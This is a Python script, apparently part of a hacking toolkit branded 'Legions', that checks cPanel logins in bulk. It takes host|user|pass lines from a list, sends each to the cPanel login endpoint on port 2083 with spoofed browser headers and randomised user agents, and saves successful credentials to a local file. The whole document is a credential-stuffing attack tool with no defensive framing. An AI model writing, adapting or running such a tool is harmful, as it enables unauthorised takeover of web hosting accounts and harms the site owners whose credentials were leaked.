import os, sys
from threading import Thread
try:
	import requests
	from user_agent import generate_user_agent
	from cfonts import render
except ModuleNotFoundError:
	os.system("python3 -m pip install requests")
	os.system("python3 -m pip install user-agent")
	os.system("python3 -m pip install python-cfonts")
finally:
	os.system(["clear", "cls"][os.name == "nt"])


def check(reqiuerment):
	host, user, pas = reqiuerment.split(" ")[0].split('|')
	if not host.endswith(":2083"):
		host += ":2083"
	try:
		response = requests.post(
			url=host +"/login/?login_only=1",
			headers={
				'Accept':'*/*',
				'Accept-Encoding':'gzip, deflate, br',
				'Accept-Language':'ar-YE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
				'Connection':'keep-alive',
				'Content-Length':'30',
				'Content-type':'application/x-www-form-urlencoded',
				'Cookie':'timezone=Asia/Baghdad; traffic=; _policy=%7B%22restricted_market%22:true,%22tracking_market%22:%22explicit%22%7D; pathway=d80e2fd2-dafc-51d8-a582-4f23fe979396; visitor=vid=d80e2fd2-dafc-51d8-a582-4f23fe979396; fb_sessiontraffic=C_TOUCH=2023-05-23T15:06:46.394Z&pathway=d80e2fd2-dafc-51d8-a582-4f23fe979396&V_DATE=2023-05-23T15:06:46.370Z&pc=1; utag_main=v_id:01884926010c00143ccd2e60a80100065008905d004ee$_sn:1$_ss:1$_st:1684856207442$ses_id:1684854407442%3Bexp-session$_pn:1%3Bexp-session; expBannerSplit=B; OPTOUTMULTI=0:1%7Cc3:1%7Cc2:1%7Cc4:1; _consentBImpression=1; cpsession=closed',
				'Host': host,
				'Origin': host,
				'Referer': host + '/logout/?locale=en',
				'Sec-Fetch-Dest':'empty',
				'Sec-Fetch-Mode':'cors',
				'Sec-Fetch-Site':'same-origin',
				'User-Agent': generate_user_agent(),
				'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
				'sec-ch-ua-mobile':'?0',
				'sec-ch-ua-platform':'"Linux"'},
		data={
			"user": user,
			"pass": pas})
		
		if response.json()["status"] or 'status: 1' in response.text :
			print("\033[2;32m■ Login Successfuly:-", user + "|" + pas)
			with open("cpanel-login.txt", "a") as o:
				o.write(host +"|"+ user +"|"+ pas + "\n")
		else:
			print("\033[1;31m• Bad Login...")
	except (
		requests.exceptions.ConnectionError,
		requests.exceptions.JSONDecodeError
	):
		print("\033[1;31m • Bad Host:\033[1;31m", host)


#print(render("Legions", font="block", colors=["bright_red", "bright_yellow"], align='center'))
#while True:
#	try:
#		file = sys.argv[1] if len(sys.argv) > 1 else input("\033[1;33m○ Enter File name(cpanel.txt):\033[1;37m")
#		for line in open(file, 'r').read().splitlines():
#			th = Thread(target=check, args=[line])
#			th.daemon = True
#			th.start()
#			th.join()
#	except FileNotFoundError:
#		print('\033[1;31m\n  ~ Not Found File.')
